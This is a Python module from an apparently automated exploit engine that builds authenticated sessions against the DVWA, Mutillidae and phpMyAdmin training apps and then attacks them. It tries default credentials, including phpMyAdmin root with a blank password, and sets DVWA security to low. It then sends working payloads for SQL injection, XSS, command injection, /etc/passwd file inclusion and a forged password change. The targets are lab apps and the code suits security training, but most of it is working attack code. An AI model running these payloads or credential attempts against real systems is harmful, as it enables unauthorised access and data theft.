"""Web-application session state for authenticated exploit vectors.

DVWA requires a CSRF ``user_token`` on every login, Mutillidae needs a
cookie jar before its pages render, and phpMyAdmin needs the login token
before the default-credential POST counts. The curl one-liners in the
YAML specs cannot do that, so those vectors always came back as login
pages. This module owns one browser-like :class:`WebSession` per app and
one handler per strategy, and returns the response text that
``modules.exploit_engine.outcomes.classify_outcome`` can judge.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any

import requests

DEFAULT_TIMEOUT = 15.0
DEFAULT_DVWA_PREFIX = "/dvwa"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
)
DVWA_CREDENTIALS: tuple[tuple[str, str], ...] = (
    ("1337", "charley"),
    ("admin", "password"),
    ("gordonb", "abc123"),
)
CSRF_DVWA_CREDENTIALS: tuple[tuple[str, str], ...] = (
    ("gordonb", "abc123"),
    ("1337", "charley"),
    ("admin", "password"),
)
APP_KEYWORDS: tuple[str, ...] = ("dvwa", "mutillidae", "phpmyadmin")
_TOKEN_RE = re.compile(r'name=["\']user_token["\']\s*value=["\']([^"\']+)["\']', re.IGNORECASE)
_PMA_TOKEN_RE = re.compile(r'name=["\']token["\']\s*value=["\']([^"\']+)["\']', re.IGNORECASE)
_LOGGED_IN_RE = re.compile(r"logout|dvwa database|user account", re.IGNORECASE)
_PMA_WELCOME_RE = re.compile(r"Welcome to phpMyAdmin|Database server|Server version", re.IGNORECASE)


@dataclass
class WebSession:
    """One browser-like session against a single web app base URL.

    Attributes:
        base: Scheme + host + port (+ app prefix) the session is bound to.
        session: ``requests.Session`` instance with proxy env disabled.
        timeout: Per-request wall-clock budget in seconds.
        page: Text of the most recent response.
    """

    base: str
    session: Any
    timeout: float = DEFAULT_TIMEOUT
    page: str = ""

    def get(self, path: str) -> str:
        """Fetch one page and remember its text.

        Args:
            path: Path relative to ``base``.

        Returns:
            The response text (empty on any transport error).
        """
        try:
            response = self.session.get(self.base + path, timeout=self.timeout, verify=True)
            self.page = response.text or ""
        except requests.exceptions.SSLError:
            from core.http import lab_tolerant_request

            try:
                response = lab_tolerant_request("get", self.base + path, timeout=self.timeout)
                self.page = response.text or ""
            except Exception:
                self.page = ""
        except Exception:
            self.page = ""
        return self.page

    def post(self, path: str, data: dict[str, str]) -> str:
        """Submit one form and remember its text.

        Args:
            path: Path relative to ``base``.
            data: Form fields.

        Returns:
            The response text (empty on any transport error).
        """
        try:
            response = self.session.post(
                self.base + path, data=data, timeout=self.timeout, verify=True
            )
            self.page = response.text or ""
        except requests.exceptions.SSLError:
            from core.http import lab_tolerant_request

            try:
                response = lab_tolerant_request("post", self.base + path, data=data, timeout=self.timeout)
                self.page = response.text or ""
            except Exception:
                self.page = ""
        except Exception:
            self.page = ""
        return self.page

    def logged_in(self) -> bool:
        """Report whether the current page shows an authenticated marker.

        Returns:
            True when the DVWA page no longer shows the login form.
        """
        page = self.page or ""
        if "login.php" not in page.lower() and "logout" not in page.lower():
            return bool(_LOGGED_IN_RE.search(page))
        return "logout" in page.lower()

    def token(self, pattern: re.Pattern[str]) -> str:
        """Extract a CSRF token from the current page.

        Args:
            pattern: Compiled token regex.

        Returns:
            The token value, or an empty string.
        """
        match = pattern.search(self.page or "")
        return match.group(1) if match else ""


def _new_session() -> Any:
    """Build one proxy-disabled browser-like requests session.

    Returns:
        A configured ``requests.Session``.
    """
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import requests

    session = requests.Session()
    session.trust_env = False
    session.headers.update({"User-Agent": USER_AGENT, "Accept": "text/html"})
    return session


def _base_url(host: str, port: str, prefix: str = "") -> str:
    """Build the base URL for one web app.

    Args:
        host: Target address.
        port: Resolved HTTP port.
        prefix: App path prefix (with leading slash).

    Returns:
        The base URL string.
    """
    port = str(port or "").strip()
    authority = f"{host}:{port}" if port and port not in ("80", "") else host
    scheme = "https" if port == "443" else "http"
    return f"{scheme}://{authority}{prefix}"


def dvwa_login(host: str, port: str, credentials: tuple[tuple[str, str], ...]) -> WebSession | None:
    """Establish an authenticated DVWA session at security=low.

    Args:
        host: Target address.
        port: Resolved HTTP port.
        credentials: Credential pairs to try in order.

    Returns:
        A logged-in :class:`WebSession`, or None when login never lands.
    """
    for prefix in (DEFAULT_DVWA_PREFIX, ""):
        web = WebSession(_base_url(host, port, prefix), _new_session())
        web.get("/login.php")
        token = web.token(_TOKEN_RE)
        for username, password in credentials:
            web.post(
                "/login.php",
                {"username": username, "password": password, "user_token": token, "Login": "Login"},
            )
            if not web.logged_in():
                web.get("/login.php")
                token = web.token(_TOKEN_RE)
                continue
            security_page = web.get("/security.php")
            security_token = web.token(_TOKEN_RE)
            if security_token:
                security_page = web.post(
                    "/security.php",
                    {"security": "low", "seclev_submit": "Submit", "user_token": security_token},
                )
            else:
                web.post("/security.php", {"security": "low", "seclev_submit": "Submit"})
            if web.logged_in():
                web.base = _base_url(host, port, prefix)
                return web
    return None


def mutillidae_session(host: str, port: str) -> WebSession:
    """Establish a Mutillidae cookie session (no login required).

    Args:
        host: Target address.
        port: Resolved HTTP port.

    Returns:
        A :class:`WebSession` holding the app cookies.
    """
    web = WebSession(_base_url(host, port, "/mutillidae"), _new_session())
    web.get("/index.php")
    return web


def phpmyadmin_login(host: str, port: str) -> WebSession | None:
    """Establish a phpMyAdmin session with the root/blank default cred.

    Args:
        host: Target address.
        port: Resolved HTTP port.

    Returns:
        A :class:`WebSession` after the login POST, or None when the app
        is absent.
    """
    for prefix in ("/phpmyadmin", "/phpMyAdmin"):
        web = WebSession(_base_url(host, port, prefix), _new_session())
        page = web.get("/index.php")
        if "phpmyadmin" not in page.lower():
            continue
        token = web.token(_PMA_TOKEN_RE)
        data: dict[str, str] = {"pma_username": "root", "pma_password": "", "server": "1"}
        if token:
            data["token"] = token
        web.post("/index.php", data)
        if _PMA_WELCOME_RE.search(web.page or "") and "login" not in (web.page or "").lower()[:2000]:
            return web
        return web
    return None


def _dvwa_attack(web: WebSession, strategy: str) -> str:
    """Run one DVWA attack request on an established session.

    Args:
        web: Authenticated DVWA session.
        strategy: Candidate strategy name.

    Returns:
        The attack response text.
    """
    if "sqli_blind" in strategy:
        return web.get("/vulnerabilities/sqli_blind/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")
    if "sqli" in strategy:
        return web.get("/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")
    if "xss_dom" in strategy:
        return web.get("/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E")
    if "xss" in strategy:
        return web.get("/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E")
    if "command_injection" in strategy:
        return web.get("/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit")
    if "lfi" in strategy:
        return web.get("/vulnerabilities/fi/?page=/etc/passwd")
    if "csrf" in strategy:
        return web.get("/vulnerabilities/csrf/?password_new=lzpass&password_conf=lzpass&Change=Change")
    return web.get("/index.php")


def _mutillidae_attack(web: WebSession, strategy: str) -> str:
    """Run one Mutillidae attack request on an established session.

    Args:
        web: Mutillidae session.
        strategy: Candidate strategy name.

    Returns:
        The attack response text.
    """
    if "command_injection" in strategy:
        return web.post(
            "/index.php?page=dns-lookup.php",
            {"target_host": "127.0.0.1 ; id", "dns-lookup-php-submit-button": "Lookup DNS"},
        )
    if "lfi" in strategy:
        return web.get("/index.php?page=/etc/passwd")
    if "sqli" in strategy:
        return web.get(
            "/index.php?page=user-info.php&username=%27%20OR%201%3D1--%20-&password=lz"
            "&user-info-php-submit-button=View+Account+Details"
        )
    if "xss" in strategy:
        return web.get(
            "/index.php?page=user-info.php&username=%27%3Cscript%3Ealert(1)%3C/script%3E"
            "&password=lz&user-info-php-submit-button=View+Account+Details"
        )
    return web.get("/index.php")


def run_web_vector(candidate: Any, profile: Any, timeout: float = DEFAULT_TIMEOUT) -> str:
    """Run an authenticated web-app vector end to end in Python.

    Args:
        candidate: Exploit candidate whose strategy names the app.
        profile: Target profile providing ``ip``.
        timeout: Per-request wall-clock budget.

    Returns:
        The attack response text, or an empty string when the strategy
        is not a web-app vector or the app is unreachable.
    """
    strategy = str(getattr(candidate, "strategy", "") or "").lower()
    matched = [word for word in APP_KEYWORDS if word in strategy]
    if not matched or "brute" in strategy or "upload" in strategy or "rfi" in strategy:
        return ""
    try:
        from modules.exploit_engine.ports import resolve_candidate_port

        port = resolve_candidate_port(candidate, profile)
    except Exception:
        port = ""
    host = str(getattr(profile, "ip", "") or "")
    if not host:
        return ""
    try:
        if matched[0] == "dvwa":
            web = dvwa_login(host, port, DVWA_CREDENTIALS if "csrf" not in strategy else CSRF_DVWA_CREDENTIALS)
            if web is None:
                return ""
            return _dvwa_attack(web, strategy)
        if matched[0] == "mutillidae":
            return _mutillidae_attack(mutillidae_session(host, port), strategy)
        if matched[0] == "phpmyadmin":
            web = phpmyadmin_login(host, port)
            if web is None:
                return ""
            return web.page
    except Exception:
        return ""
    return ""


__all__ = ["WebSession", "run_web_vector", "dvwa_login", "phpmyadmin_login", "mutillidae_session"]
